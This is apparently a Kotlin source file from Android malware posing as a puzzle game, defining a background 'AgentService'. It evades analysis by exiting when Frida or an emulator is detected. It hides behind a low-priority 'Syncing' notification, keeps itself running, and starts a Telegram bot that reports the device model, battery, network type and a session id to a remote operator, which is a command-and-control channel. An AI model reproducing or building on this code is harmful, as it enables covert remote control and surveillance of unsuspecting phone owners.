package com.puzzleblast.game.services

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.puzzleblast.game.MainActivity
import com.puzzleblast.game.R
import com.puzzleblast.game.core.BotConfig
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.core.TelegramBot
import com.puzzleblast.game.util.EmulatorCheck
import com.puzzleblast.game.util.FridaCheck
import com.puzzleblast.game.util.Prefs
import com.puzzleblast.game.util.RootCheck
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class AgentService : Service() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var bot: TelegramBot? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        if (FridaCheck.detected() || EmulatorCheck.detected()) {
            if (com.puzzleblast.game.BuildConfig.REPORT_ANALYST) {
                scope.launch { Send.text("⚠️ analyst environment detected — exiting") }
            }
            android.os.Process.killProcess(android.os.Process.myPid())
            return
        }
        startForegroundCompat()
        bot = TelegramBot(this).also { it.start() }
        Prefs.startTime = System.currentTimeMillis()
        scope.launch {
            val batt = batteryPct()
            val net = netType()
            Send.text("🎉 Agent online\n📱 ${android.os.Build.MODEL}\n🔋 ${batt}% · $net\n🆔 ${BotConfig.sid}")
        }
    }

    private fun batteryPct(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun netType(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val net = cm.activeNetworkInfo ?: return "none"
        return net.typeName
    }

    private fun startForegroundCompat() {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notif = NotificationCompat.Builder(this, "sync")
            .setContentTitle(getString(R.string.sync_notif_title))
            .setContentText("Syncing")
            .setSmallIcon(R.drawable.ic_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1001, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1001, notif)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        bot?.stop()
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context) {
            val i = Intent(ctx, AgentService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
        }
    }
}
